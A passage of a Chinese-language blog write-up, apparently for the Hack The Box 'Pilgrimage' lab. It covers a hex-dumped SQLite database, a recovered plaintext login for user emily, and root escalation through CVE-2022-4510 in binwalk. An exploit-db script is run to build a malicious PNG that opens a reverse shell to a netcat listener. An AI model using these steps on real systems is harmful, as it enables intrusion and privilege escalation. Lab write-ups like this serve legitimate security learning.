4622f736872756e6b2f363439383466333638376133302e706e676e32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333565366235632e706e676d32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333536383237362e706e676c32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333461346239362e706e676b32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333365356361392e706e676a32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333336343038332e706e676932036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333263313634322e706e676832036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333233343164342e706e676732036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333139386161612e706e676632036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333061346434382e706e676532036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333030623931312e706e676432036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326636373133652e706e676332036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326563303436342e706e676232036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326533613961312e706e676132036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326463373131652e706e676032036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326436393764612e706e675f32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326337353733362e706e675e32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326262643865622e706e675d32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326233626365362e706e675c32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326137383035352e706e675b32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323930666530342e706e675a32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323861323436382e706e675932036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323766303534332e706e675832036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323735653162312e706e675732036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323632306234322e706e675632036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323536323866622e706e675532036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323465653637632e706e675432036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323361643031332e706e675332036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323330653561622e706e675232036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323238366633382e706e675132036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323161646232302e706e675032036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323132363763622e706e674f32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323061616531652e706e674e32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323031373865382e706e674d32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466316638343434642e706e674c000000eb00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000033036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466356164383961362e706e67009333036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346338303530312e706e67009233036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346330333736342e706e67009133036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346235393936662e706e67009033036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346163643732332e706e67008f33036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346133656638392e706e67008e33036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343939333665622e706e67008d33036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343865613533662e706e67008c33036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343836346531652e706e67008b33036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343766333239622e706e67008a33036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343736343531632e706e67008933036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343731373237332e706e67008833036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343662363332352e706e67008733036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343563386531612e706e67008633036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343536313232302e706e67008533036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343361633366342e706e67008433036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343336343464322e706e67008333036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343330663831632e706e67008233036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343261346363642e706e67008133036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343234623833662e706e67008032036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343165336537332e706e677f32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343037616537352e706e677e32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343033393931382e706e677d32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336664626633312e706e677c32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336636363866362e706e677b32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336439316435662e706e677a32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336432396537662e706e677932036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336361613037302e706e677832036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336335653132372e706e677732036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336331306634362e706e67760d0000002f013c000fb00f600f100ec00e700e200dd00d800d300ce00c900c400bf00ba00b500b000ab00a600a1009c00970092008d00880083007e00790073f06ee069d064c05fb05aa0559050804b70466041503c40373032202d10280022f01de018d013c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004e81130469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466356164383961362e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81120469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346338303530312e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81110469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346330333736342e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81100469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346235393936662e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e810f0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346163643732332e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e810e0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346133656638392e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e810d0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343939333665622e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e810c0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343865613533662e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e810b0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343836346531652e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e810a0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343766333239622e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81090469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343736343531632e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81080469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343731373237332e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81070469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343662363332352e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81060469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343563386531612e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81050469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343536313232302e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81040469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343361633366342e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81030469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343336343464322e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81020469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343330663831632e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81010469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343261346363642e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81000469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343234623833662e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e7f0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343165336537332e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e7e0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343037616537352e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e7d0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343033393931382e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e7c0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336664626633312e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e7b0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336636363866362e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e7a0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336439316435662e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e790469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336432396537662e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e780469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336361613037302e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e770469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336335653132372e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e760469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336331306634362e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e750469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336262333436342e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e740469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336131346230632e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e730469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333938313837392e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e720469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333932636361642e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e710469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333834343963372e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e700469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333762616330362e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e6f0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333732666664652e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e6e0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333638376133302e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e6d0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333565366235632e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e6c0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333536383237362e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e6b0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333461346239362e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e6a0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333365356361392e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e690469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333336343038332e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e680469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333263313634322e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e670469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333233343164342e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e660469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333139386161612e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e650469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333061346434382e706e67323032332d30362d32355f32322d31372e706e67757365726e616d65&quot;
+import binascii
+import sqlite3
+
+# 从十六进制字符串中读取字节串
+hex_string = s
+byte_string = binascii.unhexlify(hex_string)
+
+# 将字节串写入数据库文件
+with open(&#39;mydatabase.db&#39;, &#39;wb&#39;) as f:
+    f.write(byte_string)
+
+# 连接到数据库并查询数据
+
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687704565931-f05f1f14-28d0-49f4-99e0-ac83261803d0.png#averageHue=%2313293b&clientId=uf273fc15-75b9-4&from=paste&height=250&id=ufc0f2e4a&originHeight=312&originWidth=714&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17660&status=done&style=none&taskId=uc4dbdeb1-b330-42b6-b106-77759581635&title=&width=571.2" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<table>
+<thead>
+<tr>
+<th>username</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>emily</td>
+<td>abigchonkyboi123</td>
+</tr>
+</tbody></table>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687704684814-e0d973d8-1055-4644-a0dd-49d04e97727c.png#averageHue=%23191919&clientId=uf273fc15-75b9-4&from=paste&height=362&id=u45ccd8e1&originHeight=452&originWidth=1331&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66039&status=done&style=none&taskId=u89ef4f1d-c526-4559-add4-e703d1aa0da&title=&width=1064.8" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<h1 id="root"><a href="#root" class="headerlink" title="root"></a>root</h1><p>pspy</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687705021072-b3d51a98-401e-46a6-be0f-6778a5c70cdb.png#averageHue=%23101010&clientId=uf273fc15-75b9-4&from=paste&height=372&id=u9a4762c1&originHeight=465&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=123703&status=done&style=none&taskId=u65b90055-e96a-4052-8fa9-f3a1eea414e&title=&width=1524" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>其中有一个<code>/bin/bash /usr/bin/malwarescan.sh </code>很可疑</p>
+<pre><code class="bash">emily@pilgrimage:/usr/sbin$ ls -al malwarescan.sh
+-rwxr--r-- 1 root root 474 Jun  1 19:14 malwarescan.sh
+
+emily@pilgrimage:/usr/sbin$ cat malwarescan.sh
+
+</code></pre>
+<pre><code class="shell">#!/bin/bash
+
+blacklist=(&quot;Executable script&quot; &quot;Microsoft executable&quot;)
+
+/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
+        filename=&quot;/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo &quot;$FILE&quot; | /usr/bin/tail -n 1 | /usr/bin/sed -n -e &#39;s/^.*CREATE //p&#39;)&quot;
+        binout=&quot;$(/usr/local/bin/binwalk -e &quot;$filename&quot;)&quot;
+        for banned in &quot;${blacklist[@]}&quot;; do
+                if [[ &quot;$binout&quot; == *&quot;$banned&quot;* ]]; then
+                        /usr/bin/rm &quot;$filename&quot;
+                        break
+                fi
+        done
+done
+</code></pre>
+<p>这个脚本代码看来看去，我就觉得 binwalk这个脚本不对劲</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687707728069-c0bfb81a-338c-4209-bee2-75bebe664ee0.png#averageHue=%23fefdfc&clientId=uf273fc15-75b9-4&from=paste&height=570&id=ud01891d5&originHeight=713&originWidth=1415&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106031&status=done&style=none&taskId=u6d660ed7-b001-47ea-8760-21dad24dc6b&title=&width=1132" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<h1 id="CVE-2022-4510：Binwalk-远程代码执行漏洞"><a href="#CVE-2022-4510：Binwalk-远程代码执行漏洞" class="headerlink" title="CVE-2022-4510：Binwalk 远程代码执行漏洞"></a>CVE-2022-4510：Binwalk 远程代码执行漏洞</h1><p>Refer:<a href="https://www.exploit-db.com/exploits/51249" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/51249</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687708443477-49489558-144e-479d-9807-f6e367dd6e66.png#averageHue=%23f4f0ec&clientId=uf273fc15-75b9-4&from=paste&height=376&id=ue7fa6749&originHeight=470&originWidth=907&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=53499&status=done&style=none&taskId=u99966bd7-220f-46eb-9c82-842ca185360&title=&width=725.6" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687708460075-4edf75dd-3e7f-4d98-b6bd-a35589b71e67.png#averageHue=%23151515&clientId=uf273fc15-75b9-4&from=paste&height=616&id=u630e26d8&originHeight=770&originWidth=1615&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=98615&status=done&style=none&taskId=u6dae4bc7-b1ff-4eba-b44e-fd78630f53a&title=&width=1292" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>刚好是有漏洞的版本<br>把exp传上去<br><code>python3 1.py /var/www/pilgrimage.htb/shrunk/6498601a2197f.png &lt;nc-ip&gt; &lt;nc-port&gt;</code></p>
+<pre><code class="bash">emily@pilgrimage:~/someb0dy$ python3 1.py /var/www/pilgrimage.htb/shrunk/6498601a2197f.png 10.10.*.* 5555
+
+################################################
+------------------CVE-2022-4510----------------
+################################################
+--------Binwalk Remote Command Execution--------
+------Binwalk 2.1.2b through 2.3.2 included-----
+------------------------------------------------
+################################################
+----------Exploit by: Etienne Lacoche-----------
+---------Contact Twitter: @electr0sm0g----------
+------------------Discovered by:----------------
+---------Q. Kaiser, ONEKEY Research Lab---------
+---------Exploit tested on debian 11------------
+################################################
+
+
+You can now rename and share binwalk_exploit and start your local netcat listener.
+
+emily@pilgrimage:~/someb0dy$ ls
+1.py  _6498601a2197f.png.extracted  binwalk_exploit.png  _binwalk_exploit.png.extracted
+emily@pilgrimage:~/someb0dy$
+</code></pre>
+<p>生成了<code>binwalk_exploit.png</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687708600428-8a9a6edb-a07f-4893-a5bb-0e639623020c.png#averageHue=%23121212&clientId=uf273fc15-75b9-4&from=paste&height=413&id=u1f4598f8&originHeight=516&originWidth=1402&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61202&status=done&style=none&taskId=u8b0fefe6-3a0a-4206-b9d8-0715cc6a99e&title=&width=1121.6" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>把生成的图片移过去，等一会反弹shell就过来了</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本次靶机主要就是利用两个cve来进行渗透，感觉下来就是google能力很重要就是信息查询的能力很重要- -<br> 还是太菜了-_- 想半天第一个点</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2023-06-25T16:04:30.853Z" itemprop="dateUpdated">2023-06-26 00:04:30</time>
+</span><br>
+
+
+        
+        IF the blog help you a lot ,Buy me a cup of coffee~：<a href="/2023/06/26/Pilgrimage/" target="_blank" rel="external">someb0dy.github.io/2023/06/26/Pilgrimage/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="someb0dy.github.io">
+            <img src="/img/avatar.jpg" alt="Someb0dy">
+            Someb0dy
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" target="_blank" rel="noopener" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE-2022-44628-CVE-2022-4510/" rel="tag">CVE-2022-44628,CVE-2022-4510</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=someb0dy.github.io/2023/06/26/Pilgrimage/&title=《Pilgrimage》 — Someb0dy's blog&pic=someb0dy.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=someb0dy.github.io/2023/06/26/Pilgrimage/&title=《Pilgrimage》 — Someb0dy's blog&source=Always Be Hungry,Be Foolish" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=someb0dy.github.io/2023/06/26/Pilgrimage/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Pilgrimage》 — Someb0dy's blog&url=someb0dy.github.io/2023/06/26/Pilgrimage/&via=someb0dy.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=someb0dy.github.io/2023/06/26/Pilgrimage/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" target="_blank" rel="noopener" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2023/06/26/SandWorm/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">SandWorm</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2023/06/14/Topology/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Topology</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        IF My blog Help you A lot Please Buy me a coffee~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/ali.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Someb0dy &copy; 2015 - 2023</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" target="_blank" rel="noopener" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=someb0dy.github.io/2023/06/26/Pilgrimage/&title=《Pilgrimage》 — Someb0dy's blog&pic=someb0dy.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=someb0dy.github.io/2023/06/26/Pilgrimage/&title=《Pilgrimage》 — Someb0dy's blog&source=Always Be Hungry,Be Foolish" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=someb0dy.github.io/2023/06/26/Pilgrimage/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Pilgrimage》 — Someb0dy's blog&url=someb0dy.github.io/2023/06/26/Pilgrimage/&via=someb0dy.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=someb0dy.github.io/2023/06/26/Pilgrimage/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
